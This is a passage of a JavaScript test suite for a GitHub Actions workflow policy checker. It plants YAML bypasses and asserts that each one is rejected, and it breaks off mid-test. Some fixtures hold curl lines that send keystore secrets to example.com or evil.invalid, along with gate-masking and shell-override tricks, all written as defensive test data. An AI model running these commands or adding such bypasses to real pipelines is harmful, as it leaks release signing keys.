/**
 * Workflow policy on parsed YAML.
 *
 * A tag reference is mutable and YAML has many spellings for the same grant.
 * These fixtures plant every confirmed bypass — anchors, folded scalars, tags,
 * quoted job keys, multiline `uses`, masked gate steps, a no-op aggregate, a
 * decoy publish flag — and the CLI test proves each one exits nonzero. The real
 * tree is then held to the same rules.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  GATE_COMMANDS,
  INJECTION_KEYS,
  PINNED_ACTIONS,
  RELEASE_FILE,
  WORKFLOW_DIR,
  checkReleaseWorkflow,
  checkWorkflow,
  checkWorkflows,
  jobNames,
  logicalCommands,
  parseWorkflow,
  publishCommands,
  shellCommands,
} from '../scripts/check-workflows.mjs';
import { projectRoot } from './helpers/project-files.mjs';
import { collectFiles } from '../scripts/precache.mjs';
import { DISTRIBUTION_FILES } from '../scripts/lib/distribution.mjs';
import { manifestTypeProblem, probe, probeMethod, smokePaths } from '../scripts/smoke-pages.mjs';

const CHECKOUT_SHA = '3d3c42e5aac5ba805825da76410c181273ba90b1';
const POLICY = join(projectRoot, 'scripts', 'check-workflows.mjs');

/** A workflow that satisfies every policy rule. */
const VALID = `name: Example

on:
  pull_request:

permissions:
  contents: read

concurrency:
  group: example-\${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@${CHECKOUT_SHA} # v7.0.1
        with:
          persist-credentials: false
      - name: Echo something benign
        run: echo done
`;

/** A workflow with the one aggregate job, named so the checks.yml gate table does not apply. */
const AGGREGATE = `name: Aggregate

on:
  pull_request:

permissions:
  contents: read

concurrency:
  group: aggregate
  cancel-in-progress: true

jobs:
  web:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - run: echo web
  browser:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - run: echo browser
  required:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    if: always()
    needs: [web, browser]
    steps:
      - name: Every leg must have succeeded
        env:
          NEEDS: \${{ toJSON(needs) }}
        run: node scripts/check-required.mjs
`;

/** The exact real files, for negative mutations that must preserve everything else. */
const real = async () =>
  Object.fromEntries(
    await Promise.all(
      (await readdir(join(projectRoot, WORKFLOW_DIR))).map(async (name) => [
        name,
        await readFile(join(projectRoot, WORKFLOW_DIR, name), 'utf8'),
      ])
    )
  );

async function runPolicy(t, files) {
  const directory = await mkdtemp(join(tmpdir(), 'drypoint-workflows-'));
  t.after(() => rm(directory, { recursive: true, force: true }));
  for (const [name, text] of Object.entries(files)) await writeFile(join(directory, name), text);
  try {
    execFileSync(process.execPath, [POLICY, '--workflows', directory], {
      cwd: projectRoot,
      encoding: 'utf8',
      stdio: 'pipe',
    });
    return 0;
  } catch (error) {
    return error.status ?? 1;
  }
}

test('a compliant workflow has no findings', () => {
  assert.deepEqual(checkWorkflow(VALID, { file: 'example.yml' }), []);
});

test('syntax errors and duplicate keys fail before any policy rule', () => {
  const syntax = checkWorkflow('name: broken\non: [\n', { file: 'broken.yml' });
  assert.ok(syntax.some((finding) => /YAML|BAD_INDENT|FLOW_SEQUENCE/.test(finding)), 'a syntax error is a finding');

  const duplicate = checkWorkflow(VALID.replace('permissions:\n  contents: read', 'permissions:\n  contents: read\npermissions:\n  contents: read'), {
    file: 'duplicate.yml',
  });
  assert.ok(duplicate.some((finding) => /DUPLICATE_KEY/.test(finding)), 'a duplicate key is never silently resolved');
});

test('permissions must be a scope map in every scalar spelling and through anchors', () => {
  const replaceTop = (value) => VALID.replace('permissions:\n  contents: read', value);
  const cases = [
    ['anchor', replaceTop('env:\n  GRANT: &grant write-all\npermissions: *grant')],
    ['folded', replaceTop('permissions: >-\n  write-all')],
    ['tagged string', replaceTop('permissions: !!str write-all')],
    ['quoted scalar', replaceTop('permissions: "read-all"')],
    ['job level', VALID.replace('    timeout-minutes: 5', '    timeout-minutes: 5\n    permissions: write-all')],
    ['quoted key', VALID.replace('permissions:\n  contents: read', '"permissions": write-all')],
    ['folded job level', VALID.replace('    timeout-minutes: 5', '    timeout-minutes: 5\n    permissions: >-\n      read-all')],
    ['scalar on the next line', VALID.replace('permissions:\n  contents: read', 'permissions:\n  "write-all"')],
  ];
  for (const [name, text] of cases) {
    const findings = checkWorkflow(text, { file: 'example.yml' });
    assert.ok(
      findings.some((finding) => /permissions must be a scope map|permission .* is (?:write|read)-all/.test(finding)),
      `${name} is a grant and must be rejected: ${findings.join(' | ')}`
    );
  }

  // Positive controls: a resolved map, quoted keys and a comment that mentions
  // the banned token are not grants.
  assert.deepEqual(checkWorkflow(replaceTop('env:\n  GRANT: &grant\n    contents: read\npermissions: *grant'), { file: 'example.yml' }), []);
  assert.deepEqual(checkWorkflow(VALID.replace('  contents: read', '  contents: read # never write-all'), { file: 'example.yml' }), []);
});

test('every job key is enumerated, quoted, spaced or bare', () => {
  const extra = (name) =>
    VALID.replace(
      'jobs:\n',
      `jobs:\n  ${name}:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hello\n`
    );
  for (const name of ['"lint"', 'lint :', "'lint'"]) {
    const findings = checkWorkflow(extra(name), { file: 'example.yml' });
    assert.ok(
      findings.some((finding) => finding.includes('has no timeout-minutes') && finding.includes('lint')),
      `${name} is enumerated: ${findings.join(' | ')}`
    );
  }
});

test('a multiline uses: is normalized and still checked', () => {
  const multiline = (value) => VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, `uses:\n          ${value}`);
  assert.ok(
    checkWorkflow(multiline('actions/checkout@v4'), { file: 'example.yml' }).some((finding) =>
      /not pinned to a 40-character commit/.test(finding)
    ),
    'a folded value is the same action reference'
  );
  assert.deepEqual(checkWorkflow(multiline(`actions/checkout@${CHECKOUT_SHA}`), { file: 'example.yml' }), []);
  const spaced = VALID.replace('uses: actions/checkout@', 'uses : actions/checkout@');
  assert.deepEqual(checkWorkflow(spaced, { file: 'example.yml' }), []);
  assert.ok(
    checkWorkflow(spaced.replace(CHECKOUT_SHA, 'v7'), { file: 'example.yml' }).some((finding) => /not pinned/.test(finding)),
    'spacing is not a bypass'
  );
});

test('only commits on the allowlist may run, and local actions are rejected', () => {
  const unknown = VALID.replace(`actions/checkout@${CHECKOUT_SHA}`, `some/unknown-action@${CHECKOUT_SHA}`);
  assert.ok(checkWorkflow(unknown, { file: 'example.yml' }).some((finding) => /not on the pinned action allowlist/.test(finding)));
  const wrongSha = VALID.replace(CHECKOUT_SHA, '0'.repeat(40));
  assert.ok(checkWorkflow(wrongSha, { file: 'example.yml' }).some((finding) => /must be pinned to/.test(finding)));
  for (const reference of ['actions/checkout@v7', 'actions/checkout@main', `actions/checkout@${CHECKOUT_SHA.slice(1)}x`]) {
    assert.ok(
      checkWorkflow(VALID.replace(`actions/checkout@${CHECKOUT_SHA}`, reference), { file: 'example.yml' }).some((finding) =>
        /not pinned to a 40-character commit/.test(finding)
      ),
      `${reference} is rejected`
    );
  }
  for (const reference of ['./.github/actions/local', './pr/.evil']) {
    assert.ok(
      checkWorkflow(VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, `uses: ${reference}`), { file: 'example.yml' }).some((finding) =>
        /must not run a local action/.test(finding)
      ),
      `${reference} runs repository code and is rejected`
    );
  }
});

test('a checkout never persists credentials', () => {
  const persisting = VALID.replace('          persist-credentials: false\n', '');
  assert.ok(checkWorkflow(persisting, { file: 'example.yml' }).some((finding) => /persist-credentials: false/.test(finding)));
});

test('the top-level contract is enforced: permissions, concurrency, timeout, no pull_request_target', () => {
  assert.ok(
    checkWorkflow(VALID.replace('permissions:\n  contents: read\n\n', ''), { file: 'example.yml' }).some((finding) =>
      /no top-level permissions block/.test(finding)
    )
  );
  assert.ok(
    checkWorkflow(VALID.replace(/concurrency:\n(?: {2}.*\n)+/, ''), { file: 'example.yml' }).some((finding) =>
      /no top-level concurrency block/.test(finding)
    )
  );
  assert.ok(
    checkWorkflow(VALID.replace('    timeout-minutes: 5\n', ''), { file: 'example.yml' }).some((finding) =>
      /job "build" has no timeout-minutes/.test(finding)
    )
  );
  assert.ok(
    checkWorkflow(VALID.replace('pull_request:', 'pull_request_target:'), { file: 'example.yml' }).some((finding) =>
      /pull_request_target is banned/.test(finding)
    )
  );
});

test('a run: script is not workflow YAML', () => {
  const text = VALID.replace(
    '    steps:\n',
    '    steps:\n      - name: Echo\n        run: |\n          echo "uses: actions/checkout@v1"\n          echo done\n'
  );
  assert.deepEqual(logicalCommands('echo "uses: actions/checkout@v1"'), ['echo "uses: actions/checkout@v1"']);
  assert.deepEqual(checkWorkflow(text, { file: 'example.yml' }), [], 'a script line is not an action reference');
});

test('the aggregate reads every leg from toJSON(needs) and runs even after a failure', () => {
  assert.deepEqual(checkWorkflow(AGGREGATE, { file: 'aggregate.yml' }), []);

  const unlisted = AGGREGATE.replace(
    '  required:\n',
    '  lint:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: echo lint\n  required:\n'
  );
  assert.ok(
    checkWorkflow(unlisted, { file: 'aggregate.yml' }).some((finding) => /job "lint" is not listed in required\.needs/.test(finding)),
    'a new job cannot stay outside the aggregate'
  );

  const noAlways = AGGREGATE.replace('    if: always()\n', '');
  assert.ok(
    checkWorkflow(noAlways, { file: 'aggregate.yml' }).some((finding) => /must run with if: always\(\)/.test(finding)),
    'a skipped required check is success, so always() is the contract'
  );

  const noNeeds = AGGREGATE.replace('          NEEDS: ${{ toJSON(needs) }}\n', '');
  assert.ok(
    checkWorkflow(noNeeds, { file: 'aggregate.yml' }).some((finding) => /must pass NEEDS: \$\{\{ toJSON\(needs\) \}\}/.test(finding)),
    'the script must receive the whole map'
  );

  const noop = AGGREGATE.replace('run: node scripts/check-required.mjs', 'run: exit 0');
  assert.ok(
    checkWorkflow(noop, { file: 'aggregate.yml' }).some((finding) => /must call node scripts\/check-required\.mjs/.test(finding)),
    'a no-op step is not an aggregate'
  );

  const masked = AGGREGATE.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || true');
  assert.ok(
    checkWorkflow(masked, { file: 'aggregate.yml' }).some((finding) => /masking command "true"/.test(finding)),
    'a masked aggregate cannot fail'
  );

  const handBuilt = AGGREGATE.replace(
    '          NEEDS: ${{ toJSON(needs) }}',
    '          NEEDS: ${{ toJSON(needs) }}\n          WEB: ${{ needs.web.result }}'
  );
  assert.ok(
    checkWorkflow(handBuilt, { file: 'aggregate.yml' }).some((finding) => /hardcodes a leg name/.test(finding)),
    'the toJSON expression does not excuse a second hardcoded leg read'
  );

  // Logic moved into an opaque action script is not the tested command.
  const scripted = AGGREGATE.replace(
    '        run: node scripts/check-required.mjs',
    `        uses: some/action@${'a'.repeat(40)}\n        with:\n          script: |\n            const results = \${{ toJSON(needs) }};`
  );
  assert.ok(
    checkWorkflow(scripted, { file: 'checks.yml' }).some((finding) => /keep gate or release logic in a run: step/.test(finding)),
    'with.script is inspected, not trusted'
  );

  // A gate that runs only on pull requests is skipped on a tag push; the
  // aggregate would then pass without checking it.
  const eventOnly = AGGREGATE.replace('  browser:\n', "  browser:\n    if: github.event_name == 'pull_request'\n");
  assert.ok(
    checkWorkflow(eventOnly, { file: 'aggregate.yml' }).some((finding) => /must run on every trigger/.test(finding)),
    'a leg that skips a tag cannot satisfy required.needs on a tag'
  );
});

test('gate steps are exact commands and cannot be masked', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  const cases = [
    ['or true', checks.replace('run: npm run test:unit', 'run: npm run test:unit || true'), /masking command "true"/],
    ['semicolon true', checks.replace('run: npm run test:unit', 'run: npm run test:unit; true'), /masking command "true"/],
    ['step condition', checks.replace('run: npm run test:unit', 'if: false\n        run: npm run test:unit'), /gate step must not carry an if/],
    [
      'continue-on-error',
      checks.replace(
        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
        '      - name: Unit test suite (the browser suites have their own job)\n        continue-on-error: true\n        run: npm run test:unit'
      ),
      /must not set continue-on-error/,
    ],
    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly these commands/],
    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /must run exactly these commands/],
    ['missing gate', checks.replace('run: node scripts/check-required.mjs', 'run: echo done'), /must run exactly these commands/],
    // A dead branch, a here-doc, a pipeline, a subshell, a brace group and a
    // shell wrapper all execute something other than the registered command.
    [
      'dead if',
      checks.replace(
        '        run: node scripts/check-required.mjs',
        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
      ),
      /gate step must run only the registered commands|must run exactly these commands/,
    ],
    [
      'here-doc',
      checks.replace(
        '        run: node scripts/check-required.mjs',
        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
      ),
      /gate step must run only the registered commands|must run exactly these commands/,
    ],
    ['pipe cat', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat'), /gate step must run only the registered commands|must run exactly these commands/],
    ['path true', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true'), /gate step must run only the registered commands|must run exactly these commands/],
    ['subshell', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || (exit 0)'), /gate step must run only the registered commands|must run exactly these commands/],
    ['brace group', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || { true; }'), /gate step must run only the registered commands|must run exactly these commands/],
    ['sh -c', checks.replace('run: node scripts/check-required.mjs', "run: node scripts/check-required.mjs || sh -c 'exit 0'"), /gate step must run only the registered commands|must run exactly these commands/],
    ['redirection', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs > /dev/null'), /gate step must run only the registered commands|must run exactly these commands/],
  ];
  for (const [name, text, pattern] of cases) {
    const findings = checkWorkflow(text, { file: 'checks.yml' });
    assert.ok(findings.some((finding) => pattern.test(finding)), `${name}: ${findings.join(' | ')}`);
    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${name}: the CLI exits nonzero`);
  }
});

test('only release.yml sign may use the release environment or read a secret', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  const release = files[RELEASE_FILE];
  const cases = [
    ['web environment', 'checks.yml', checks.replace('  web:\n', '  web:\n    environment: release\n')],
    ['policy environment', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    environment: release\n')],
    [
      'new job environment',
      'checks.yml',
      checks.replace(
        '  required:\n',
        '  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    environment: release\n    steps:\n      - run: echo steal\n  required:\n'
      ),
    ],
    ['publish environment', RELEASE_FILE, release.replace('  publish:\n    name: publish', '  publish:\n    environment: release\n    name: publish')],
    [
      'web secret in run',
      'checks.yml',
      checks.replace(
        '      - name: Privacy gate\n        run: npm run privacy:check',
        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Privacy gate\n        run: npm run privacy:check'
      ),
    ],
    [
      'policy secret in run',
      'checks.yml',
      checks.replace(
        '      - name: Workflow policy and privacy on the candidate tree',
        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
      ),
    ],
    [
      'build secret in run',
      RELEASE_FILE,
      release.replace(
        '        run: npm run verify:all',
        '        run: npm run verify:all && curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/'
      ),
    ],
  ];
  for (const [name, file, text] of cases) {
    const findings = checkWorkflow(text, { file });
    assert.ok(
      findings.some((finding) => /must not declare environment|must not read secrets/.test(finding)),
      `${name}: ${findings.join(' | ')}`
    );
    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
  }

  // The one real grant stays: sign uses the release environment and secrets.
  const sign = parseWorkflow(release).workflow.jobs.sign;
  assert.equal(sign.environment, 'release');
  assert.match(JSON.stringify(sign), /secrets\.ANDROID_KEYSTORE_BASE64/);
  assert.equal(await runPolicy(t, files), 0, 'the real tree is the positive control');
});

test('a merged workflow edit cannot grant the release key, hide a gate, or weaken the attestation', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  const release = files[RELEASE_FILE];
  const cases = [
    // F2-1: any job other than `sign` with any environment spelling, and any
    // secret reference the old dotted-only scan missed.
    [
      'web environment expression',
      'checks.yml',
      checks.replace('  web:\n', "  web:\n    environment:\n      name: ${{ github.ref == 'refs/heads/main' && 'release' || 'none' }}\n"),
      /must not declare environment/,
    ],
    [
      'web environment map',
      'checks.yml',
      checks.replace('  web:\n', '  web:\n    environment:\n      name: release\n'),
      /must not declare environment/,
    ],
    [
      'workflow env secret',
      'checks.yml',
      checks.replace('permissions:\n', 'env:\n  LEAK: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\npermissions:\n'),
      /workflow env must not read secrets/,
    ],
    [
      'secret in a step condition',
      'checks.yml',
      checks.replace(
        '      - name: Privacy gate\n        run: npm run privacy:check',
        "      - name: Privacy gate\n        if: ${{ secrets.ANDROID_KEYSTORE_PASSWORD != '' }}\n        run: npm run privacy:check"
      ),
      /must not read secrets/,
    ],
    [
      'secret index in build env',
      RELEASE_FILE,
      release.replace(
        "      ANDROID_BUILD_TOOLS: '36.0.0'\n",
        "      ANDROID_BUILD_TOOLS: '36.0.0'\n      EXFIL: ${{ secrets[format('{0}', 'ANDROID_KEYSTORE_BASE64')] }}\n"
      ),
      /must not read secrets/,
    ],
    [
      'extra web step',
      'checks.yml',
      checks.replace(
        '      - name: Install the one dev-only dependency\n        run: npm ci\n',
        '      - name: Diagnostics\n        run: curl -fsS -X POST --data-binary "$LEAK" https://evil.invalid/upload || true\n      - name: Install the one dev-only dependency\n        run: npm ci\n'
      ),
      /must have exactly/,
    ],
    [
      'extra browser step',
      'checks.yml',
      checks.replace(
        '      - name: Measured layout suites',
        '      - name: Extra\n        run: echo extra\n      - name: Measured layout suites'
      ),
      /must have exactly/,
    ],
    // F2-2: job-level defaults/container/services/working-directory.
    [
      'web job defaults shell',
      'checks.yml',
      checks.replace('  web:\n', "  web:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n"),
      /must not declare defaults/,
    ],
    [
      'web job defaults working-directory',
      'checks.yml',
      checks.replace('  web:\n', '  web:\n    defaults:\n      run:\n        working-directory: test\n'),
      /must not declare defaults/,
    ],
    ['web job container', 'checks.yml', checks.replace('  web:\n', '  web:\n    container: node:22\n'), /must not declare container/],
    [
      'web job services',
      'checks.yml',
      checks.replace('  web:\n', '  web:\n    services:\n      helper:\n        image: ghcr.io/attacker/helper:latest\n'),
      /must not declare services/,
    ],
    [
      'browser and android defaults',
      'checks.yml',
      checks
        .replace('  browser:\n', "  browser:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n")
        .replace('  android:\n', "  android:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n"),
      /must not declare defaults/,
    ],
    // F4: npm config and shell environment cannot no-op a gate.
    [
      'step npm_config_script_shell',
      'checks.yml',
      checks.replace(
        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
        '      - name: Unit test suite (the browser suites have their own job)\n        env:\n          npm_config_script_shell: /bin/true\n        run: npm run test:unit'
      ),
      /must not set npm_config_script_shell/,
    ],
    [
      'step uppercase NPM_CONFIG_SCRIPT_SHELL',
      'checks.yml',
      checks.replace(
        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
        '      - name: Unit test suite (the browser suites have their own job)\n        env:\n          NPM_CONFIG_SCRIPT_SHELL: /bin/true\n        run: npm run test:unit'
      ),
      /must not set NPM_CONFIG_SCRIPT_SHELL/,
    ],
    [
      'job HOME',
      'checks.yml',
      checks.replace('  browser:\n', '  browser:\n    env:\n      HOME: /tmp/evil\n'),
      /must not set HOME/,
    ],
    [
      'workflow SHELL',
      'checks.yml',
      checks.replace('permissions:\n', 'env:\n  SHELL: /bin/true\npermissions:\n'),
      /workflow env must not set SHELL/,
    ],
    [
      'workflow IFS',
      'checks.yml',
      checks.replace('permissions:\n', "env:\n  IFS: ','\npermissions:\n"),
      /workflow env must not set IFS/,
    ],
    // F2-3/F2-4/F6: the bundle is verified and the signed subject is pinned.
    [
      'bundle selected with find',
      RELEASE_FILE,
      release.replace(
        '          shopt -s nullglob\n',
        '          bundle="$(find . -maxdepth 1 -type f -name \'sha256*.jsonl\' -print -quit)"\n          shopt -s nullglob\n'
      ),
      /must not select the bundle with find/,
    ],
    [
      'bundle signature check removed',
      RELEASE_FILE,
      release.replace('          gh attestation verify "$apk" \\\n', ''),
      /must verify the bundle signature/,
    ],
    [
      'bundle glob over dist',
      RELEASE_FILE,
      release.replace('          files=(dist/attest/*.jsonl)\n', '          files=(dist/*.jsonl)\n'),
      /must download the bundle into the dedicated dist\/attest directory/,
    ],
    [
      'attestation subject swapped to notes',
      RELEASE_FILE,
      release.replace(
        '          subject-path: dist/drypoint-${{ needs.resolve.outputs.version }}.apk\n',
        '          subject-path: dist/notes.md\n'
      ),
      /must attest dist\/drypoint/,
    ],
    [
      'attestation digest swapped to notes',
      RELEASE_FILE,
      release.replace(
        '          apk_sha="$(sha256sum "dist/drypoint-${VERSION}.apk" | awk \'{print $1}\')"',
        '          apk_sha="$(sha256sum "dist/notes.md" | awk \'{print $1}\')"'
      ),
      /must hash the signed APK itself|run: must be the exact body/,
    ],
    [
      'sign step extra command',
      RELEASE_FILE,
      release.replace(
        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n',
        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n          curl -fsS -X POST --data-binary @"$RUNNER_TEMP/release.jks" https://evil.invalid/upload || true\n'
      ),
      /run: must be the exact body/,
    ],
    [
      'every attested statement required',
      RELEASE_FILE,
      release.replace('              and any($statements[];', '              and all($statements[];'),
      /must not require every statement/,
    ],
    // F3/F7: a dead branch around a guard is a body change.
    [
      'resolve ancestry guard dead',
      RELEASE_FILE,
      release.replace(
        '            tag="${tags[0]}"\n            if ! git merge-base --is-ancestor "$sha" origin/main; then\n              echo "::error::$sha is not an ancestor of origin/main"\n              exit 1\n            fi\n',
        '            tag="${tags[0]}"\n            if false; then\n              if ! git merge-base --is-ancestor "$sha" origin/main; then\n                echo "::error::$sha is not an ancestor of origin/main"\n                exit 1\n              fi\n            fi\n'
      ),
      /run: must be the exact body/,
    ],
    [
      'resolve version guard dead',
      RELEASE_FILE,
      release.replace(
        '            version="$(git show "$tag:package.json" | jq -r .version)"\n            if [ "$version" != "${tag#v}" ]; then\n',
        '            version="$(git show "$tag:package.json" | jq -r .version)"\n            if false; then\n            if [ "$version" != "${tag#v}" ]; then\n'
      ),
      /run: must be the exact body/,
    ],
    [
      'publish byte comparison dead',
      RELEASE_FILE,
      release.replace(
        '              if ! cmp -s "dist/${asset}" "$RUNNER_TEMP/existing/${asset}"; then\n',
        '              if false; then\n              if ! cmp -s "dist/${asset}" "$RUNNER_TEMP/existing/${asset}"; then\n'
      ),
      /run: must be the exact body/,
    ],
    // R8-F2: the bundle is not reproducible, so it is verified, not compared.
    [
      'bundle byte comparison restored',
      RELEASE_FILE,
      release.replace(
        '              "drypoint-${VERSION}.apk.sha256"; do',
        '              "drypoint-${VERSION}.apk.sha256" \\\n              "drypoint-${VERSION}.apk.intoto.jsonl"; do'
      ),
      /run: must be the exact body/,
    ],
    [
      'existing bundle not verified',
      RELEASE_FILE,
      release.replace('            gh attestation verify "$existing_apk" \\\n', ''),
      /must verify the existing bundle signature|run: must be the exact body/,
    ],
    [
      'publish SHA removed',
      RELEASE_FILE,
      release.replace(
        '      SHA: ${{ needs.resolve.outputs.sha }}\n    steps:\n      - name: Download the release files',
        '    steps:\n      - name: Download the release files'
      ),
      /env SHA must be exactly/,
    ],
  ];
  for (const [name, file, text, pattern] of cases) {
    assert.notEqual(text, file === 'checks.yml' ? checks : release, `${name}: the mutation applies`);
    const findings = checkWorkflow(text, { file });
    const releaseFindings = file === RELEASE_FILE ? checkReleaseWorkflow(text, { file }) : [];
    assert.ok(
      [...findings, ...releaseFindings].some((finding) => pattern.test(finding)),
      `${name}: ${[...findings, ...releaseFindings].join(' | ')}`
    );
    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
  }
  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
});

test('the trusted jobs run no local action and the owned workflow set is closed', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  for (const [job, anchor, replacement] of [
    [
      'policy',
      '      - name: Workflow policy and privacy on the candidate tree',
      '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree',
    ],
    ['required', '      - name: Every leg must have succeeded', '      - name: Evil\n        uses: ./.evil\n      - name: Every leg must have succeeded'],
  ]) {
    const text = checks.replace(anchor, replacement);
    assert.ok(
      checkWorkflow(text, { file: 'checks.yml' }).some((finding) => /must not run a local action/.test(finding)),
      `${job} rejects a local action`
    );
    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${job}: the CLI exits nonzero`);
  }

  const secondRelease = `name: Release Again
on:
  workflow_run:
    workflows: [Checks]
    types: [completed]
permissions:
  contents: write
  id-token: write
concurrency:
  group: release
  cancel-in-progress: false
jobs:
  sign:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    environment: release
    steps:
      - name: Checkout
        uses: actions/checkout@${CHECKOUT_SHA}
        with:
          persist-credentials: false
      - name: Steal
        run: |
          printf '%s' "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}" > key.b64
          gh release create v1.0.3 --generate-notes
`;
  assert.notEqual(await runPolicy(t, { ...files, 'release.yaml': secondRelease }), 0, 'a second release workflow fails');
  assert.notEqual(
    await runPolicy(t, {
      ...files,
      'steal.yml': 'name: Steal\non: push\npermissions:\n  contents: read\nconcurrency:\n  group: steal\njobs:\n  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: echo steal\n',
    }),
    0,
    'an unowned workflow fails'
  );
  const rest = { ...files };
  delete rest['stale.yml'];
  assert.notEqual(await runPolicy(t, rest), 0, 'a missing owned workflow fails');
  assert.equal(await runPolicy(t, files), 0, 'the exact owned set passes');
});

test('both unprivileged jobs create the one throwaway key before the build', async (t) => {
  const releaseText = await readFile(join(projectRoot, WORKFLOW_DIR, RELEASE_FILE), 'utf8');
  const checksText = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
  const parsed = (text) => parseWorkflow(text).workflow;
  for (const [file, job] of [
    ['checks.yml', parsed(checksText).jobs.android],
    [RELEASE_FILE, parsed(releaseText).jobs.build],
  ]) {
    const commands = job.steps.map((step) => step.run ?? '').filter(Boolean);
    const keystore = commands.findIndex((run) => run.includes('node scripts/ci-keystore.mjs'));
    const build = commands.findIndex((run) => run.includes('npm run build:android'));
    assert.ok(keystore >= 0, `${file}: the keystore step exists`);
    assert.ok(build > keystore, `${file}: the key is created before the build`);
    assert.equal(commands.filter((run) => run.includes('node scripts/ci-keystore.mjs')).length, 1, `${file}: called once`);
  }
  assert.ok(GATE_COMMANDS['checks.yml'].android.includes('node scripts/ci-keystore.mjs'));
  assert.doesNotMatch(JSON.stringify(parsed(releaseText).jobs.sign), /ci-keystore|ANDROID_ALLOW_TEST_KEY/);
  assert.doesNotMatch(releaseText, /ci-throwaway-not-a-release-key/);
  assert.doesNotMatch(checksText, /ci-throwaway-not-a-release-key/);

  // Removing or reordering the owner is a policy finding, not a silent
  // "CI=true with no key" failure at release time.
  const files = await real();
  const mutations = {
    'checks keystore removed': {
      'checks.yml': checksText.replace('        run: node scripts/ci-keystore.mjs', '        run: echo no-key'),
    },
    'release keystore removed': {
      [RELEASE_FILE]: releaseText.replace('        run: node scripts/ci-keystore.mjs', '        run: echo no-key'),
    },
    'release keystore moved after the build': {
      [RELEASE_FILE]: releaseText
        .replace('        run: node scripts/ci-keystore.mjs', '        run: echo moved')
        .replace(
          '        run: npm run build:android',
          '        run: npm run build:android\n      - name: Create a throwaway signing key\n        working-directory: ${{ env.RELEASE_TREE }}\n        run: node scripts/ci-keystore.mjs'
        ),
    },
  };
  for (const [name, replacement] of Object.entries(mutations)) {
    assert.notEqual(await runPolicy(t, { ...files, ...replacement }), 0, `${name}: the CLI exits nonzero`);
  }

  const hardcoded = checksText.replace(
    '        run: node scripts/ci-keystore.mjs',
    '        run: echo ci-throwaway-not-a-release-key > pass.txt'
  );
  assert.ok(
    checkWorkflow(hardcoded, { file: 'checks.yml' }).some((finding) => /must not hardcode the CI throwaway password/.test(finding)),
    'the password has one owner'
  );
  assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': hardcoded }), 0);
});

test('trusted wiring, injection, permissions and release authority reject every planted mutation', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  const release = files[RELEASE_FILE];
  const cases = [
    // A2-V1: job-level continue-on-error.
    ['required continue-on-error', 'checks.yml', checks.replace('  required:\n', '  required:\n    continue-on-error: true\n'), /job "required" must not set continue-on-error/],
    ['web continue-on-error', 'checks.yml', checks.replace('  web:\n', '  web:\n    continue-on-error: true\n'), /job "web" must not set continue-on-error/],
    ['build continue-on-error', RELEASE_FILE, release.replace('  build:\n', '  build:\n    continue-on-error: true\n'), /job "build" must not set continue-on-error/],
    // A2-V2/F9: trusted checkout refs and paths.
    [
      'policy checkout pr head',
      'checks.yml',
